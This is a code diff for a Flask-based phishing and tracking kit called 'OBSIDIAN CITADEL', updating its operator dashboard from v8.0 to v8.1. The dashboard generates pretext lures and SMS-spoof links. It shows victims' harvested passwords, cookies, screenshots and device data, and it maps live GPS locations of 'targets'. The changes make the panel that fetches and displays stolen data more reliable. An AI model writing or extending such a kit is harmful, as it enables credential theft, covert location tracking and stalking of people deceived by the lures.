@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
-# FORGE - OBSIDIAN CITADEL v8.0
-# Premium UI · Zero-Permission Harvest · Full Database
+# FORGE - OBSIDIAN CITADEL v8.1 - FULLY WORKING
+# Premium UI · Zero-Permission Harvest · Real Database
 
 import os
 import sys
@@ -15,7 +15,7 @@ import uuid
 from flask import Flask, request, jsonify, render_template_string, session
 import qrcode
 
-VERSION = "8.0"
+VERSION = "8.1"
 ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'wasteland2147')
 PUBLIC_URL = os.environ.get('PUBLIC_URL', 'https://your-app.onrender.com')
 
@@ -47,7 +47,16 @@ def load_db():
                 return json.load(f)
         except:
             pass
-    return {'links': {}, 'captures': [], 'history': [], 'screenshots': [], 'passwords': [], 'cookies': []}
+    return {
+        'links': {},
+        'captures': [],
+        'history': [],
+        'screenshots': [],
+        'passwords': [],
+        'cookies': [],
+        'devices': [],
+        'wifi': []
+    }
 
 def save_db(db):
     with open(DB_FILE, 'w') as f:
@@ -93,7 +102,6 @@ HTML = '''
         }
         body { background: var(--bg-primary); color: var(--text-primary); font-family: 'Inter', -apple-system, sans-serif; min-height: 100vh; overflow-x: hidden; }
         
-        /* ===== SIDEBAR ===== */
         .sidebar { position: fixed; left: 0; top: 0; bottom: 0; width: 240px; background: rgba(10,14,23,0.92); backdrop-filter: blur(20px); border-right: 1px solid var(--glass-border); padding: 24px 16px; z-index: 100; transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1); overflow-y: auto; }
         .sidebar .logo { display: flex; align-items: center; gap: 10px; font-size: 1.2rem; font-weight: 700; margin-bottom: 32px; padding: 0 8px; }
         .sidebar .logo span { background: linear-gradient(135deg, var(--accent-1), var(--accent-2)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
@@ -106,11 +114,9 @@ HTML = '''
         .sidebar .nav .section-label { font-size: 0.6rem; text-transform: uppercase; letter-spacing: 0.8px; color: var(--text-muted); padding: 16px 14px 6px; font-weight: 600; }
         .sidebar .bottom { margin-top: auto; padding-top: 20px; border-top: 1px solid var(--glass-border); }
         
-        /* ===== MAIN ===== */
         .main { margin-left: 240px; padding: 24px 32px; min-height: 100vh; }
         @media (max-width: 768px) { .sidebar { transform: translateX(-100%); } .sidebar.open { transform: translateX(0); } .main { margin-left: 0; padding: 16px; } }
         
-        /* ===== TOP BAR ===== */
         .topbar { display: flex; justify-content: space-between; align-items: center; padding: 12px 0 24px; flex-wrap: wrap; gap: 12px; }
         .topbar .left { display: flex; align-items: center; gap: 16px; }
         .topbar .left .menu-btn { display: none; background: none; border: none; color: var(--text-primary); font-size: 1.5rem; cursor: pointer; }
@@ -123,15 +129,13 @@ HTML = '''
         .topbar .right .search input::placeholder { color: var(--text-muted); }
         .topbar .right .avatar { width: 36px; height: 36px; border-radius: 50%; background: linear-gradient(135deg, var(--accent-1), var(--accent-2)); display: flex; align-items: center; justify-content: center; font-weight: 600; font-size: 0.8rem; cursor: pointer; border: 2px solid rgba(255,255,255,0.1); }
         
-        /* ===== STATS ===== */
-        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 16px; margin-bottom: 24px; }
+        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 16px; margin-bottom: 24px; }
         .stat-card { background: var(--bg-card); backdrop-filter: blur(12px); border: 1px solid var(--glass-border); border-radius: var(--radius); padding: 20px; transition: all 0.3s; }
         .stat-card:hover { background: var(--bg-card-hover); transform: translateY(-2px); box-shadow: var(--shadow-hover); }
         .stat-card .label { font-size: 0.7rem; text-transform: uppercase; letter-spacing: 0.5px; color: var(--text-secondary); }
         .stat-card .value { font-size: 2rem; font-weight: 700; margin: 6px 0; }
         .stat-card .change { font-size: 0.7rem; color: var(--accent-3); }
         
-        /* ===== CARDS ===== */
         .card { background: var(--bg-card); backdrop-filter: blur(12px); border: 1px solid var(--glass-border); border-radius: var(--radius); padding: 24px; margin-bottom: 24px; transition: all 0.3s; }
         .card:hover { background: var(--bg-card-hover); }
         .card .card-title { display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; font-size: 0.85rem; font-weight: 600; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 0.5px; }
@@ -157,19 +161,16 @@ HTML = '''
         .qr-container { display: flex; justify-content: center; margin: 12px 0; }
         .qr-container img { max-width: 120px; border-radius: var(--radius-sm); background: white; padding: 6px; }
         
-        /* ===== MAP ===== */
         #map { height: 320px; border-radius: var(--radius-sm); border: 1px solid var(--glass-border); width: 100%; }
         @media (max-width: 768px) { #map { height: 240px; } }
         
-        /* ===== LOG ===== */
-        .log-container { max-height: 200px; overflow-y: auto; background: rgba(0,0,0,0.3); border-radius: var(--radius-sm); padding: 8px; border: 1px solid var(--glass-border); font-family: monospace; font-size: 0.7rem; }
-        .log-entry { display: flex; gap: 10px; padding: 4px 8px; border-bottom: 1px solid rgba(255,255,255,0.03); align-items: center; flex-wrap: wrap; }
+        .log-container { max-height: 250px; overflow-y: auto; background: rgba(0,0,0,0.3); border-radius: var(--radius-sm); padding: 8px; border: 1px solid var(--glass-border); font-family: monospace; font-size: 0.7rem; }
+        .log-entry { display: flex; gap: 10px; padding: 6px 8px; border-bottom: 1px solid rgba(255,255,255,0.03); align-items: center; flex-wrap: wrap; }
         .log-entry .time { color: var(--text-muted); min-width: 50px; }
         .log-entry .loc { color: var(--accent-3); }
         .log-entry .ip { color: var(--accent-2); }
         .log-entry .clickable { cursor: pointer; color: var(--accent-1); text-decoration: underline; }
         
-        /* ===== TABS ===== */
         .tabs { display: flex; gap: 4px; margin-bottom: 16px; flex-wrap: wrap; }
         .tabs button { padding: 8px 18px; border: none; background: transparent; color: var(--text-secondary); font-size: 0.8rem; font-weight: 500; cursor: pointer; border-radius: var(--radius-sm); transition: 0.2s; }
         .tabs button.active { background: rgba(108,92,231,0.15); color: var(--accent-1); }
@@ -177,40 +178,31 @@ HTML = '''
         .tab-content { display: none; }
         .tab-content.active { display: block; }
         
-        /* ===== TABLES ===== */
         .table-wrap { overflow-x: auto; }
         table { width: 100%; border-collapse: collapse; font-size: 0.8rem; }
         table th { text-align: left; padding: 10px 12px; color: var(--text-secondary); font-weight: 500; border-bottom: 1px solid var(--glass-border); }
-        table td { padding: 10px 12px; border-bottom: 1px solid rgba(255,255,255,0.03); }
+        table td { padding: 10px 12px; border-bottom: 1px solid rgba(255,255,255,0.03); word-break: break-all; }
         table tr:hover { background: rgba(255,255,255,0.02); }
         .badge-status { padding: 2px 10px; border-radius: 20px; font-size: 0.65rem; font-weight: 500; }
         .badge-status.success { background: rgba(0,255,136,0.15); color: var(--accent-3); }
         .badge-status.warning { background: rgba(243,156,18,0.15); color: var(--accent-4); }
         .badge-status.danger { background: rgba(231,76,60,0.15); color: #e74c3c; }
         
-        /* ===== SCROLLBAR ===== */
         ::-webkit-scrollbar { width: 4px; height: 4px; }
         ::-webkit-scrollbar-track { background: transparent; }
         ::-webkit-scrollbar-thumb { background: var(--accent-1); border-radius: 10px; }
         
-        /* ===== RESPONSIVE ===== */
         @media (max-width: 480px) { .stats { grid-template-columns: 1fr 1fr; } .topbar .right .search { display: none; } .card { padding: 16px; } }
         @media (min-width: 768px) and (max-width: 1024px) { .stats { grid-template-columns: repeat(3, 1fr); } }
         
-        /* ===== GLASS EFFECTS ===== */
         .glass { background: var(--bg-card); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); border: 1px solid var(--glass-border); }
         .glass:hover { background: var(--bg-card-hover); }
-        
         .url-highlight { background: rgba(0,255,136,0.08); border: 1px solid rgba(0,255,136,0.2); border-radius: var(--radius-sm); padding: 12px; margin: 8px 0; word-break: break-all; font-size: 0.8rem; color: var(--accent-3); }
-        
         .preview-text { font-size: 0.7rem; color: var(--text-secondary); background: rgba(0,0,0,0.3); padding: 4px 12px; border-radius: 20px; border: 1px solid var(--glass-border); }
-        
         .flex { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; }
         .flex-between { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 8px; }
         .mt-8 { margin-top: 8px; }
         .mt-16 { margin-top: 16px; }
-        .gap-8 { gap: 8px; }
-        .gap-16 { gap: 16px; }
         .text-muted { color: var(--text-secondary); font-size: 0.8rem; }
         .text-success { color: var(--accent-3); }
         .text-accent { color: var(--accent-1); }
@@ -219,9 +211,8 @@ HTML = '''
 </head>
 <body>
 
-<!-- ===== SIDEBAR ===== -->
 <div class="sidebar" id="sidebar">
-    <div class="logo"><span>◈ CITADEL</span><span class="badge">v8.0</span></div>
+    <div class="logo"><span>◈ CITADEL</span><span class="badge">v8.1</span></div>
     <div class="nav">
         <div class="section-label">Core</div>
         <a class="active" data-tab="dashboard"><span class="icon">📊</span> Dashboard</a>
@@ -237,38 +228,36 @@ HTML = '''
         <a data-tab="settings"><span class="icon">⚙️</span> Settings</a>
     </div>
     <div class="bottom">
-        <div style="font-size:0.6rem;color:var(--text-muted);padding:8px;">OBSIDIAN CITADEL v8.0</div>
+        <div style="font-size:0.6rem;color:var(--text-muted);padding:8px;">OBSIDIAN CITADEL v8.1</div>
     </div>
 </div>
 
-<!-- ===== MAIN ===== -->
 <div class="main" id="mainContent">
-    <!-- TOPBAR -->
     <div class="topbar">
         <div class="left">
             <button class="menu-btn" id="menuBtn">☰</button>
             <h2 id="pageTitle">Dashboard <small>Real-time overview</small></h2>
         </div>
         <div class="right">
-            <div class="search"><span>🔍</span><input placeholder="Search..."></div>
+            <div class="search"><span>🔍</span><input placeholder="Search..." id="searchInput"></div>
             <span class="status" id="statusBadge" style="font-size:0.65rem;color:var(--text-secondary);background:var(--bg-secondary);padding:4px 14px;border-radius:20px;border:1px solid var(--glass-border);">● LIVE</span>
             <div class="avatar" onclick="fetch('/api/logout',{method:'POST'}).then(()=>window.location.reload())">A</div>
         </div>
     </div>
 
-    <!-- ===== TAB: DASHBOARD ===== -->
+    <!-- DASHBOARD -->
     <div id="tab-dashboard" class="tab-content active">
         <div class="stats" id="statsContainer">
-            <div class="stat-card"><div class="label">Total Links</div><div class="value" id="linkCount">0</div><div class="change">▲ Generated</div></div>
-            <div class="stat-card"><div class="label">Total Captures</div><div class="value" id="captureCount">0</div><div class="change">▲ Location pings</div></div>
-            <div class="stat-card"><div class="label">Live Targets</div><div class="value" id="liveCount">0</div><div class="change">● Active</div></div>
-            <div class="stat-card"><div class="label">Passwords Harvested</div><div class="value" id="passwordCount">0</div><div class="change">🔑 Credentials</div></div>
-            <div class="stat-card"><div class="label">Screenshots</div><div class="value" id="screenshotCount">0</div><div class="change">🖼️ Captured</div></div>
-            <div class="stat-card"><div class="label">Uptime</div><div class="value" id="uptimeDisplay">--</div><div class="change">⏱ Running</div></div>
+            <div class="stat-card"><div class="label">Total Links</div><div class="value" id="linkCount">0</div><div class="change">Generated</div></div>
+            <div class="stat-card"><div class="label">Total Captures</div><div class="value" id="captureCount">0</div><div class="change">Location pings</div></div>
+            <div class="stat-card"><div class="label">Live Targets</div><div class="value" id="liveCount">0</div><div class="change">Active</div></div>
+            <div class="stat-card"><div class="label">Passwords</div><div class="value" id="passwordCount">0</div><div class="change">Harvested</div></div>
+            <div class="stat-card"><div class="label">Screenshots</div><div class="value" id="screenshotCount">0</div><div class="change">Captured</div></div>
+            <div class="stat-card"><div class="label">Uptime</div><div class="value" id="uptimeDisplay">--</div><div class="change">Running</div></div>
         </div>
 
         <div class="card">
-            <div class="card-title">📡 Recent Activity <span class="badge">Live</span></div>
+            <div class="card-title">📡 Recent Activity <span class="badge" id="recentBadge">Live</span></div>
             <div class="log-container" id="logArea"><div class="log-entry"><span class="time">--:--</span><span>Waiting for targets...</span></div></div>
         </div>
 
@@ -278,7 +267,7 @@ HTML = '''
         </div>
     </div>
 
-    <!-- ===== TAB: FORGE ===== -->
+    <!-- FORGE -->
     <div id="tab-forge" class="tab-content">
         <div class="card">
             <div class="card-title">⚡ Forge New Lure</div>
@@ -286,7 +275,6 @@ HTML = '''
                 <select id="lureType">
                     <option value="siren">📡 Siren Link (GPS+IP+Screenshot)</option>
                     <option value="sms_spoof">📱 SMS Spoof</option>
-                    <option value="wifi_beacon">📶 Wi-Fi Beacon</option>
                 </select>
                 <input type="text" id="pretextInput" placeholder="Pretext (e.g. 'Delivery ready')">
                 <button class="btn btn-primary" id="generateBtn">⚡ Generate</button>
@@ -295,7 +283,7 @@ HTML = '''
         </div>
     </div>
 
-    <!-- ===== TAB: MAP ===== -->
+    <!-- MAP -->
     <div id="tab-map" class="tab-content">
         <div class="card">
             <div class="card-title">🗺️ Live Target Tracking <span class="badge" id="mapTargetCount">0</span></div>
@@ -310,7 +298,7 @@ HTML = '''
         </div>
     </div>
 
-    <!-- ===== TAB: HISTORY ===== -->
+    <!-- HISTORY -->
     <div id="tab-history" class="tab-content">
         <div class="card">
             <div class="card-title">📜 Capture History <button class="btn btn-danger btn-sm" id="clearHistoryBtn" style="margin-left:auto;">Clear All</button></div>
@@ -318,7 +306,7 @@ HTML = '''
         </div>
     </div>
 
-    <!-- ===== TAB: SCREENSHOTS ===== -->
+    <!-- SCREENSHOTS -->
     <div id="tab-screenshots" class="tab-content">
         <div class="card">
             <div class="card-title">🖼️ Screenshot Gallery <span class="badge" id="screenshotGalleryCount">0</span></div>
@@ -328,7 +316,7 @@ HTML = '''
         </div>
     </div>
 
-    <!-- ===== TAB: PASSWORDS ===== -->
+    <!-- PASSWORDS -->
     <div id="tab-passwords" class="tab-content">
         <div class="card">
             <div class="card-title">🔑 Harvested Passwords <span class="badge" id="passwordTableCount">0</span></div>
@@ -341,7 +329,7 @@ HTML = '''
         </div>
     </div>
 
-    <!-- ===== TAB: COOKIES ===== -->
+    <!-- COOKIES -->
     <div id="tab-cookies" class="tab-content">
         <div class="card">
             <div class="card-title">🍪 Harvested Cookies <span class="badge" id="cookieTableCount">0</span></div>
@@ -354,7 +342,7 @@ HTML = '''
         </div>
     </div>
 
-    <!-- ===== TAB: DEVICE DATA ===== -->
+    <!-- DEVICES -->
     <div id="tab-devices" class="tab-content">
         <div class="card">
             <div class="card-title">📱 Device Intelligence <span class="badge" id="deviceCount">0</span></div>
@@ -364,7 +352,7 @@ HTML = '''
         </div>
     </div>
 
-    <!-- ===== TAB: SETTINGS ===== -->
+    <!-- SETTINGS -->
     <div id="tab-settings" class="tab-content">
         <div class="card">
             <div class="card-title">⚙️ Server Configuration</div>
@@ -378,7 +366,7 @@ HTML = '''
         <div class="card">
             <div class="card-title">📊 System Info</div>
             <div class="text-muted" style="font-size:0.7rem;">
-                <div>Version: <span id="sysVersion" style="color:var(--accent-2);">v8.0</span></div>
+                <div>Version: <span id="sysVersion" style="color:var(--accent-2);">v8.1</span></div>
                 <div>Active links: <span id="sysLinkCount">0</span></div>
                 <div>Total captures: <span id="sysCaptureCount">0</span></div>
             </div>
@@ -386,17 +374,16 @@ HTML = '''
     </div>
 </div>
 
-<!-- ===== SCRIPTS ===== -->
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script src="https://unpkg.com/leaflet.markercluster@1.4.1/dist/leaflet.markercluster.js"></script>
 <script>
 const API_BASE = window.location.origin;
 let map = null, markerCluster = null, mapInitialized = false, startTime = Date.now();
 
-// ===== SIDEBAR TOGGLE =====
+// Sidebar toggle
 document.getElementById('menuBtn').onclick = () => document.getElementById('sidebar').classList.toggle('open');
 
-// ===== SIDEBAR NAV =====
+// Sidebar navigation
 document.querySelectorAll('.sidebar .nav a').forEach(el => {
     el.onclick = () => {
         document.querySelectorAll('.sidebar .nav a').forEach(a => a.classList.remove('active'));
@@ -407,16 +394,16 @@ document.querySelectorAll('.sidebar .nav a').forEach(el => {
         if (target) target.classList.add('active');
         document.getElementById('pageTitle').innerHTML = el.textContent.trim() + ' <small>' + (tab === 'dashboard' ? 'Real-time overview' : '') + '</small>';
         if (tab === 'map') { setTimeout(() => { initMap(); fetchStats(); }, 300); }
-        if (tab === 'history') { updateHistory(); }
-        if (tab === 'screenshots') { updateScreenshots(); }
-        if (tab === 'passwords') { updatePasswords(); }
-        if (tab === 'cookies') { updateCookies(); }
-        if (tab === 'devices') { updateDevices(); }
+        if (tab === 'history') { fetchStats(); }
+        if (tab === 'screenshots') { fetchStats(); }
+        if (tab === 'passwords') { fetchStats(); }
+        if (tab === 'cookies') { fetchStats(); }
+        if (tab === 'devices') { fetchStats(); }
         if (window.innerWidth <= 768) document.getElementById('sidebar').classList.remove('open');
     };
 });
 
-// ===== INIT MAP =====
+// Init Map
 function initMap() {
     if (mapInitialized) return;
     map = L.map('map', { zoomControl: false }).setView([20, 0], 2);
@@ -429,24 +416,50 @@ function initMap() {
 
 function openGoogleMaps(lat, lon) { window.open(`https://www.google.com/maps?q=${lat},${lon}`, '_blank'); }
 
-// ===== FETCH STATS =====
+// FETCH ALL DATA
 async function fetchStats() {
     try {
-        const res = await fetch(API_BASE + '/api/links');
-        const links = await res.json();
+        // Links
+        const linkRes = await fetch(API_BASE + '/api/links');
+        const links = await linkRes.json();
         const linkKeys = Object.keys(links);
         document.getElementById('linkCount').textContent = linkKeys.length;
         document.getElementById('sysLinkCount').textContent = linkKeys.length;
 
+        // Captures
         const capRes = await fetch(API_BASE + '/api/captures');
         const allCaps = await capRes.json();
-        const totalCaps = allCaps.length;
-        document.getElementById('captureCount').textContent = totalCaps;
-        document.getElementById('sysCaptureCount').textContent = totalCaps;
+        document.getElementById('captureCount').textContent = allCaps.length;
+        document.getElementById('sysCaptureCount').textContent = allCaps.length;
 
-        // Live targets
+        // Passwords
+        const pRes = await fetch(API_BASE + '/api/passwords');
+        const passwords = await pRes.json();
+        document.getElementById('passwordCount').textContent = passwords.length;
+        document.getElementById('passwordTableCount').textContent = passwords.length;
+
+        // Screenshots
+        const sRes = await fetch(API_BASE + '/api/screenshots');
+        const screenshots = await sRes.json();
+        document.getElementById('screenshotCount').textContent = screenshots.length;
+        document.getElementById('screenshotGalleryCount').textContent = screenshots.length;
+
+        // Cookies
+        const cRes = await fetch(API_BASE + '/api/cookies');
+        const cookies = await cRes.json();
+        document.getElementById('cookieTableCount').textContent = cookies.length;
+
+        // Devices
+        const dRes = await fetch(API_BASE + '/api/devices');
+        const devices = await dRes.json();
+        document.getElementById('deviceCount').textContent = devices.length;
+
+        // Live targets + recent activity
         let liveTargets = new Set();
         let latestCoords = [];
+        let recentHtml = '';
+        let count = 0;
+
         for (let id of linkKeys) {
             const cRes = await fetch(API_BASE + `/api/captures/${id}`);
             const caps = await cRes.json();
@@ -454,62 +467,66 @@ async function fetchStats() {
                 const last = caps[caps.length-1];
                 if (last.lat && last.lon) {
                     liveTargets.add(id);
-                    latestCoords.push({ id, lat: parseFloat(last.lat), lon: parseFloat(last.lon), timestamp: last.timestamp, ip: last.ip });
+                    const lat = parseFloat(last.lat);
+                    const lon = parseFloat(last.lon);
+                    if (!isNaN(lat) && !isNaN(lon)) {
+                        latestCoords.push({ id, lat, lon, timestamp: last.timestamp, ip: last.ip });
+                    }
                 }
-                const log = document.getElementById('logArea');
-                if (log.children.length < 20) {
-                    const entry = document.createElement('div');
-                    entry.className = 'log-entry';
-                    const lat = last.lat || '--', lon = last.lon || '--';
-                    entry.innerHTML = `
-                        <span class="time">${(last.timestamp || '').slice(11,16)}</span>
-                        <span class="loc">📍 ${lat}, ${lon}</span>
-                        <span class="ip">${last.ip || 'unknown'}</span>
-                        <span class="clickable" onclick="viewOnMap('${lat}','${lon}','${id}')">🗺️</span>
-                        <span class="clickable" onclick="openGoogleMaps('${lat}','${lon}')" style="color:#4285F4;">🌍</span>
+                // Build recent activity - show last 15
+                caps.slice(-15).reverse().forEach(cap => {
+                    const lat = cap.lat || '--';
+                    const lon = cap.lon || '--';
+                    const time = cap.timestamp ? cap.timestamp.slice(11,16) : '--:--';
+                    const ip = cap.ip || 'unknown';
+                    recentHtml += `
+                        <div class="log-entry">
+                            <span class="time">${time}</span>
+                            <span class="loc">📍 ${lat}, ${lon}</span>
+                            <span class="ip">${ip}</span>
+                            <span class="clickable" onclick="viewOnMap('${lat}','${lon}','${id}')">🗺️</span>
+                            <span class="clickable" onclick="openGoogleMaps('${lat}','${lon}')" style="color:#4285F4;">🌍</span>
+                        </div>
                     `;
-                    log.prepend(entry);
-                    if (log.children.length > 25) log.removeChild(log.lastChild);
-                }
+                    count++;
+                });
             }
         }
+
+        // Update recent activity
+        const logArea = document.getElementById('logArea');
+        if (recentHtml) {
+            logArea.innerHTML = recentHtml;
+        } else {
+            logArea.innerHTML = '<div class="log-entry"><span class="time">--:--</span><span>Waiting for targets...</span></div>';
+        }
+        document.getElementById('recentBadge').textContent = count + ' events';
+
         document.getElementById('liveCount').textContent = liveTargets.size;
         document.getElementById('mapTargetCount').textContent = liveTargets.size;
-        document.getElementById('statusBadge').textContent = `● ${totalCaps} captures`;
-
-        // Password count
-        const pRes = await fetch(API_BASE + '/api/passwords');
-        const passwords = await pRes.json();
-        document.getElementById('passwordCount').textContent = passwords.length;
-        document.getElementById('passwordTableCount').textContent = passwords.length;
-
-        // Screenshot count
-        const sRes = await fetch(API_BASE + '/api/screenshots');
-        const screenshots = await sRes.json();
-        document.getElementById('screenshotCount').textContent = screenshots.length;
-        document.getElementById('screenshotGalleryCount').textContent = screenshots.length;
-
-        // Cookie count
-        const cRes = await fetch(API_BASE + '/api/cookies');
-        const cookies = await cRes.json();
-        document.getElementById('cookieTableCount').textContent = cookies.length;
+        document.getElementById('statusBadge').textContent = `● ${allCaps.length} captures`;
 
         // Uptime
         const uptime = Math.floor((Date.now() - startTime) / 1000);
         document.getElementById('uptimeDisplay').textContent = `${Math.floor(uptime/60)}m ${uptime%60}s`;
 
-        if (document.getElementById('tab-map').classList.contains('active')) updateMapMarkers(latestCoords);
-        updateHistory();
-        updateConfig();
-        updateScreenshots();
-        updatePasswords();
-        updateCookies();
-        updateDevices();
+        // Update map
+        if (document.getElementById('tab-map').classList.contains('active')) {
+            updateMapMarkers(latestCoords);
+        }
+
+        // Update history, passwords, cookies, devices, screenshots
+        await updateHistory();
+        await updatePasswords();
+        await updateCookies();
+        await updateDevices();
+        await updateScreenshots();
+        await updateConfig();
 
     } catch(e) { console.log('Stats error', e); }
 }
 
-// ===== UPDATE MAP =====
+// UPDATE MAP
 function updateMapMarkers(latestCoords) {
     if (!mapInitialized) initMap();
     if (!map || !markerCluster) return;
@@ -567,7 +584,7 @@ function viewOnMap(lat, lon, id) {
     if (!isNaN(l) && !isNaN(o)) { map.setView([l, o], 15); document.querySelector('[data-tab="map"]').click(); }
 }
 
-// ===== UPDATE HISTORY =====
+// UPDATE HISTORY
 async function updateHistory() {
     try {
         const res = await fetch(API_BASE + '/api/history');
@@ -575,10 +592,10 @@ async function updateHistory() {
         const container = document.getElementById('historyList');
         if (history.length === 0) { container.innerHTML = '<div class="text-muted">No history.</div>'; return; }
         let html = '';
-        history.slice().reverse().slice(0, 100).forEach(item => {
+        history.slice().reverse().slice(0, 50).forEach(item => {
             const lat = item.lat || '--', lon = item.lon || '--';
             html += `
-                <div class="history-item" style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid rgba(255,255,255,0.05);font-size:0.7rem;flex-wrap:wrap;gap:4px;">
+                <div style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid rgba(255,255,255,0.05);font-size:0.7rem;flex-wrap:wrap;gap:4px;">
                     <span style="color:var(--accent-3);">📍 ${lat}, ${lon}</span>
                     <span style="color:var(--accent-2);font-size:0.6rem;">${item.link_id ? item.link_id.slice(0,8) : 'unknown'}</span>
                     <span style="color:var(--text-secondary);">${item.timestamp ? item.timestamp.slice(11,16) : '--'}</span>
@@ -594,7 +611,7 @@ async function updateHistory() {
     } catch(e) { console.log('History error', e); }
 }
 
-// ===== UPDATE SCREENSHOTS =====
+// UPDATE SCREENSHOTS
 async function updateScreenshots() {
     try {
         const res = await fetch(API_BASE + '/api/screenshots');
@@ -605,11 +622,11 @@ async function updateScreenshots() {
         screenshots.slice().reverse().forEach(item => {
             html += `
                 <div style="background:rgba(0,0,0,0.3);border-radius:8px;overflow:hidden;border:1px solid var(--glass-border);">
-                    <img src="${item.data}" style="width:100%;height:auto;display:block;">
+                    <img src="${item.data || item.screenshot || ''}" style="width:100%;height:auto;display:block;">
                     <div style="padding:8px;font-size:0.6rem;color:var(--text-secondary);display:flex;justify-content:space-between;">
                         <span>${item.timestamp ? item.timestamp.slice(11,16) : '--'}</span>
                         <span>${item.ip || 'unknown'}</span>
-                        <span class="clickable" onclick="window.open('${item.data}','_blank')">🔍</span>
+                        <span class="clickable" onclick="window.open('${item.data || item.screenshot || ''}','_blank')">🔍</span>
                     </div>
                 </div>
             `;
@@ -618,7 +635,7 @@ async function updateScreenshots() {
     } catch(e) { console.log('Screenshot error', e); }
 }
 
-// ===== UPDATE PASSWORDS =====
+// UPDATE PASSWORDS
 async function updatePasswords() {
     try {
         const res = await fetch(API_BASE + '/api/passwords');
@@ -641,7 +658,7 @@ async function updatePasswords() {
     } catch(e) { console.log('Password error', e); }
 }
 
-// ===== UPDATE COOKIES =====
+// UPDATE COOKIES
 async function updateCookies() {
     try {
         const res = await fetch(API_BASE + '/api/cookies');
@@ -664,20 +681,19 @@ async function updateCookies() {
     } catch(e) { console.log('Cookie error', e); }
 }
 
-// ===== UPDATE DEVICES =====
+// UPDATE DEVICES
 async function updateDevices() {
     try {
         const res = await fetch(API_BASE + '/api/devices');
         const devices = await res.json();
         const container = document.getElementById('deviceList');
-        document.getElementById('deviceCount').textContent = devices.length;
         if (devices.length === 0) { container.innerHTML = '<div class="text-muted">No device data yet.</div>'; return; }
         let html = '';
         devices.slice().reverse().forEach(item => {
             html += `
                 <div style="background:rgba(0,0,0,0.2);border-radius:8px;padding:12px;margin-bottom:8px;border:1px solid var(--glass-border);font-size:0.75rem;">
                     <div style="display:flex;justify-content:space-between;flex-wrap:wrap;gap:4px;">
-                        <span style="color:var(--accent-2);">${item.ua || 'Unknown Device'}</span>
+                        <span style="color:var(--accent-2);">${item.ua || item.userAgent || 'Unknown Device'}</span>
                         <span style="color:var(--text-secondary);">${item.timestamp ? item.timestamp.slice(11,16) : '--'}</span>
                     </div>
                     <div style="display:flex;gap:12px;flex-wrap:wrap;margin-top:4px;color:var(--text-secondary);font-size:0.65rem;">
@@ -695,34 +711,29 @@ async function updateDevices() {
     } catch(e) { console.log('Device error', e); }
 }
 
-// ===== UPDATE CONFIG =====
+// UPDATE CONFIG
 async function updateConfig() {
     try {
         const res = await fetch(API_BASE + '/api/config');
         const config = await res.json();
         document.getElementById('currentBaseUrl').textContent = config.external_url || 'https://your-app.onrender.com';
         document.getElementById('configUrl').value = config.external_url || '';
-        document.getElementById('sysVersion').textContent = 'v' + (config.version || '8.0');
+        document.getElementById('sysVersion').textContent = 'v' + (config.version || '8.1');
         document.getElementById('publicUrlDisplay').textContent = config.external_url || 'https://your-app.onrender.com';
     } catch(e) { console.log('Config error', e); }
 }
 
-// ===== GENERATE LINK =====
+// GENERATE LINK
 document.getElementById('generateBtn').onclick = async () => {
     const type = document.getElementById('lureType').value;
     const pretext = document.getElementById('pretextInput').value || 'Default';
     const formData = new FormData();
     formData.append('pretext', pretext);
-    if (type === 'wifi_beacon') formData.append('ssid', pretext || 'Free_Public_WiFi');
     const res = await fetch(API_BASE + `/generate/${type}`, { method: 'POST', body: formData });
     const data = await res.json();
     const area = document.getElementById('resultArea');
     if (data.link) {
         let qrHTML = data.qr ? `<div class="qr-container"><img src="data:image/png;base64,${data.qr}" /></div>` : '';
-        let extra = '';
-        if (data.beacon_script) {
-            extra = `<div class="link-box"><pre style="background:#0d1520;padding:8px;border-radius:8px;font-size:0.6rem;overflow-x:auto;max-height:100px;width:100%;color:var(--accent-3);">${data.beacon_script}</pre></div>`;
-        }
         area.innerHTML = `
             <div class="link-box">
                 <input type="text" value="${data.link}" readonly id="newLinkInput">
@@ -735,18 +746,17 @@ document.getElementById('generateBtn').onclick = async () => {
                 <span class="preview-text">🆔 ${data.id}</span>
                 <span class="preview-text">${type}</span>
             </div>
-            ${extra}
         `;
     }
     fetchStats();
 };
 
-// ===== MAP CONTROLS =====
+// MAP CONTROLS
 document.getElementById('refreshMapBtn').onclick = () => fetchStats();
 document.getElementById('clearMapBtn').onclick = () => { if (markerCluster) { markerCluster.clearLayers(); document.getElementById('mapTargetList').innerHTML = '<div class="text-muted">Markers cleared.</div>'; document.getElementById('mapTargetCount').textContent = '0'; } };
 document.getElementById('fitMapBtn').onclick = () => { if (markerCluster && markerCluster.getLayers().length > 0) { try { const bounds = markerCluster.getBounds(); if (bounds.isValid()) map.fitBounds(bounds, { padding: [30, 30], maxZoom: 12 }); } catch(e) {} } };
 
-// ===== CONFIG SAVE =====
+// CONFIG SAVE
 document.getElementById('configSaveBtn').onclick = async () => {
     const url = document.getElementById('configUrl').value;
     const status = document.getElementById('configStatus');
@@ -767,7 +777,7 @@ document.getElementById('configSaveBtn').onclick = async () => {
     }
 };
 
-// ===== CLEAR HISTORY =====
+// CLEAR HISTORY
 document.getElementById('clearHistoryBtn').onclick = async () => {
     if (confirm('Clear all history?')) {
         await fetch(API_BASE + '/api/history/clear', { method: 'POST' });
@@ -775,14 +785,26 @@ document.getElementById('clearHistoryBtn').onclick = async () => {
     }
 };
 
-// ===== AUTO REFRESH =====
+// SEARCH
+document.getElementById('searchInput').oninput = function() {
+    const query = this.value.toLowerCase();
+    document.querySelectorAll('.log-entry, .history-item, table tr').forEach(el => {
+        if (el.textContent.toLowerCase().includes(query)) {
+            el.style.display = '';
+        } else {
+            el.style.display = 'none';
+        }
+    });
+};
+
+// AUTO REFRESH
 fetchStats();
 setInterval(fetchStats, 3000);
 
